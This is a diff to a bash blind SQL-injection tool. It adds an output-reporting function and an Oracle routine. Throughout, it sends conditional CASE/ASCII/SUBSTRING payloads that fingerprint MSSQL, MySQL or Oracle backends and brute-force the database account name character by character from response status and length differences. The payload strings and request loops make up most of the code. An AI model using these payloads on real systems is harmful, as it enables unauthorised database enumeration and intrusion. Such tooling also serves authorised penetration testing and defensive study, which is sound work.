@@ -461,6 +461,33 @@ cat ./payloads/system-params.txt | while read inj3ct ; do
 done
 }
 
+echoreporter()
+{
+######
+if [[ $method != "POST" ]]; then #we're doing a get - simples 
+	echo "[$remessage REQ:$K] $method URL: $uhostname$page"?"$badparams" >> ./output/$safefilename$safelogname.txt
+	echo -e '\E[31;48m'"\033[1m[$remessage REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams" ;
+	tput sgr0 # Reset attributes.
+else
+	if (($firstPOSTURIURL>0)) ; then
+		if [ $firstPOSTURIURL == 1 ] ; then
+			echo "[$remessage REQ:$K] $method URL: $uhostname$page"?"$static"??"$badparams" >> ./output/$safefilename$safelogname.txt
+			echo -e '\E[31;48m'"\033[1m[$remessage REQ:$K]\033[0m $method URL: $uhostname$page"?"$static"??"$badparams";
+			tput sgr0 # Reset attributes.
+		else
+			echo "[$remessage REQ:$K] $method URL: $uhostname	$page"??"$badparams" >> ./output/$safefilename$safelogname.txt
+			echo -e '\E[31;48m'"\033[1m[$remessage REQ:$K]\033[0m $method URL: $uhostname$page"??"$badparams";
+			tput sgr0 # Reset attributes.
+		fi
+	else
+		#normal post
+		echo "[$remessage REQ:$K] $method URL: $uhostname$page"?"$badparams" >> ./output/$safefilename$safelogname.txt
+		echo -e '\E[31;48m'"\033[1m[$remessage REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+		tput sgr0 # Reset attributes.
+	fi
+fi
+}
+
 dbtypecheck()
 {
 # try to figure out the backend db using conditional :
@@ -478,14 +505,17 @@ status_false=`echo $response | cut -d ":" -f 1`
 length_false=`echo $response | cut -d ":" -f 2`
 ((lendiff=$length_true-$length_false))
 if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
-	echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+	remessage="STATUS DIFF T:$status_true F:$status_false DB is MSSQL"
+	echoreporter
 	mssqldb=1
 	lettergrabmssql
 fi
 if [[ "$status_true" == "$status_false" ]] ; then
 	if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
-		echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
-		tput sgr0 # Reset attributes.
+		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+		remessage="LENGTH DIFF EQUALS $lendiff DB is MSSQL"
+		echoreporter
 		mssqldb=1
  		lettergrabmssql
 	fi
@@ -502,13 +532,17 @@ status_false=`echo $response | cut -d ":" -f 1`
 length_false=`echo $response | cut -d ":" -f 2`
 ((lendiff=$length_true-$length_false))
 if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
-	echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+	remessage="STATUS DIFF T:$status_true F:$status_false DB is MYSQL"
+	echoreporter
 	mysqldb=1
 fi
 #if [[ "$status_true" == "$status_false" ]] ; then
 	if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then			
-		echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
-		tput sgr0 # Reset attributes.
+		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+		#tput sgr0 # Reset attributes.
+		remessage="LENGTH DIFF EQUALS $lendiff DB is MYSQL"
+		echoreporter
 		mysqldb=1
  		lettergrabmysql
 	fi
@@ -525,14 +559,20 @@ status_false=`echo $response | cut -d ":" -f 1`
 length_false=`echo $response | cut -d ":" -f 2`
 ((lendiff=$length_true-$length_false))
 if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
-	echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams" 
+	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams" 
 	oracle=1
+	remessage="STATUS DIFF T:$status_true F:$status_false DB is ORACLE"
+	echoreporter
+	lettergraboracle
 fi
 #if [[ "$status_true" == "$status_false" ]] ; then
 	if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then			
-		echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
-		tput sgr0 # Reset attributes.
+		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+		#tput sgr0 # Reset attributes.
 		oracle=1
+		remessage="LENGTH DIFF EQUALS $lendiff DB is ORACLE"
+		echoreporter
+		lettergraboracle
 	fi
 #fi
 }
@@ -556,7 +596,9 @@ while [[ $oflag -lt $horiz ]] ; do
 			
 	((lendiff=$length_true-$length_false))
 	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
-		echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
+		#echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
+		remessage="SYS USER STRING LENGTH = $oflag"
+		echoreporter
 		sysuserlen=$oflag
 		oflag=40
 	fi
@@ -571,7 +613,7 @@ done
 horiz=$sysuserlen
 oflag=1
 iflag=32
-nambuff=""
+nambuf=""
 echo "Attempting to brute force the system_user account name. Please wait..."
 while [[ $oflag -le $horiz ]] ; do
 	badparams=`echo "$outputstore" | replace "$encodedpayload" "1/(case+when+(ascii(substring((select+system_user),$oflag,1))+=+$iflag)+then+1+else+0+end)$end"`
@@ -604,7 +646,9 @@ while [[ $oflag -le $horiz ]] ; do
 done
 echo ""
 if [[ $nambuf != "" ]] ; then 
-	echo -e '\E[31;48m'"\033[1m[SYS USER IS: $nambuf]\033[0m $method URL: $uhostname$page"?"$badparams"		
+	#echo -e '\E[31;48m'"\033[1m[SYS USER IS: $nambuf]\033[0m $method URL: $uhostname$page"?"$badparams"		
+	remessage="SYS USER IS: $nambuf"
+	echoreporter
 fi
 }
 
@@ -614,7 +658,8 @@ lettergrabmysql()
 horiz=40
 oflag=1
 while [[ $oflag -lt $horiz ]] ; do
-#								  
+	# note that i use the 1 or 1 = (condition) - this is because if 
+	# you use an invalid param value you'll get no rows back								  
 	badparams=`echo "$outputstore" | replace "$encodedpayload" "1+or+1=(case+when+(length(system_user())+>+1000)+then+1+else+2+end)"`
 	requester
 	#echo "debug sending $request"
@@ -628,13 +673,17 @@ while [[ $oflag -lt $horiz ]] ; do
 			
 	((lendiff=$length_true-$length_false))
 	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
-		echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
+		#echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
+		remessage="SYS USER STRING LENGTH = $oflag"
+		echoreporter
 		sysuserlen=$oflag
 		oflag=40
 	fi
 	if [[ "$status_true" == "$status_false" ]] ; then
 		if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
-			echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
+			#echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
+			remessage="SYS USER STRING LENGTH = $oflag"
+			echoreporter
 			sysuserlen=$oflag
 			oflag=40
 		fi
@@ -645,8 +694,8 @@ done
 horiz=$sysuserlen
 oflag=1
 iflag=32
-nambuff=""
-echo "Attempting to brute force the current MYSQL DB account name account name. Please wait..."
+nambuf=""
+echo "Attempting to brute force the current MYSQL DB account name. Please wait..."
 while [[ $oflag -le $horiz ]] ; do				   
 	badparams=`echo "$outputstore" | replace "$encodedpayload" "1+or+1=(case+when+(ascii(substring(system_user(),$oflag,1))+=+$iflag)+then+1+else+2+end)$end"`
 	requester
@@ -681,7 +730,91 @@ while [[ $oflag -le $horiz ]] ; do
 done
 echo ""
 if [[ $nambuf != "" ]] ; then 
-	echo -e '\E[31;48m'"\033[1m[SYS USER IS: $nambuf]\033[0m $method URL: $uhostname$page"?"$badparams"		
+	#echo -e '\E[31;48m'"\033[1m[SYS USER IS: $nambuf]\033[0m $method URL: $uhostname$page"?"$badparams"		
+	remessage="SYS USER IS: $nambuf"
+	echoreporter
+fi
+}
+
+lettergraboracle()
+{
+###get the length of the string
+horiz=40
+oflag=1
+while [[ $oflag -lt $horiz ]] ; do				 #  1+or+1=case+when+length((select+user+from+dual))+=+2+then+1+else+2+end		  
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "1+or+1=case+when+length((select+user+from+dual))+>+1000+then+1+else+2+end"`
+	requester
+	#echo "debug sending $request"
+	status_false=`echo $response | cut -d ":" -f 1`
+	length_false=`echo $response | cut -d ":" -f 2`          #  1+or+1=case+when+length((select+user+from+dual))+=+2+then+1+else+2+end
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "1+or+1=case+when+length((select+user+from+dual))+=+$oflag+then+1+else+2+end"`
+	requester
+	#echo "debug sending iflag $request"
+	status_true=`echo $response | cut -d ":" -f 1`
+	length_true=`echo $response | cut -d ":" -f 2`
+			
+	((lendiff=$length_true-$length_false))
+	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+		#echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
+		remessage="USER STRING LENGTH = $oflag"
+		echoreporter
+		sysuserlen=$oflag
+		oflag=40
+	fi
+	if [[ "$status_true" == "$status_false" ]] ; then
+		if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
+			#echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
+			remessage="USER STRING LENGTH = $oflag"
+			echoreporter
+			sysuserlen=$oflag
+			oflag=40
+		fi
+	fi
+	((oflag=$oflag+1)) 
+done
+###
+horiz=$sysuserlen
+oflag=1
+iflag=32
+nambuf=""
+echo "Attempting to brute force the current ORACLE DB account name. Please wait..."
+while [[ $oflag -le $horiz ]] ; do				   #1+or+1=case+when+ascii(substr((select+user+from+dual),1,1))+<+255+then+1+else+2+end
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "1+or+1=case+when+ascii(substr((select+user+from+dual),$oflag,1))+=+$iflag+then+1+else+2+end$end"`
+	requester
+	#echo "debug sending iflag $request"
+	status_true=`echo $response | cut -d ":" -f 1`
+	length_true=`echo $response | cut -d ":" -f 2`             #1+or+1=case+when+ascii(substr((select+user+from+dual),1,1))+<+255+then+1+else+2+end
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "1+or+1=case+when+ascii(substr((select+user+from+dual),1,1))+>+255+then+1+else+2+end$end"`
+	requester
+	#echo "debug sending $request"
+	status_false=`echo $response | cut -d ":" -f 1`
+	length_false=`echo $response | cut -d ":" -f 2` 
+	((lendiff=$length_true-$length_false))
+	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+		decasciiconv
+		echo -n "$output"
+		nambuf="$nambuf$output"
+		iflag=126
+	fi
+	if [[ "$status_true" == "$status_false" ]] ; then
+		if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
+			decasciiconv
+			echo -n "$output"
+			nambuf="$nambuf$output"
+			iflag=126
+		fi
+	fi
+	((iflag=$iflag+1)) 
+	if [[ $iflag == 127 ]] ; then
+		((iflag=32))
+		((oflag=$oflag+1))
+	fi	
+done
+echo ""
+if [[ $nambuf != "" ]] ; then 
+	#echo -e '\E[31;48m'"\033[1m[SYS USER IS: $nambuf]\033[0m $method URL: $uhostname$page"?"$badparams"		
+	remessage="SYS USER IS: $nambuf"
+	echoreporter
 fi
 }
 
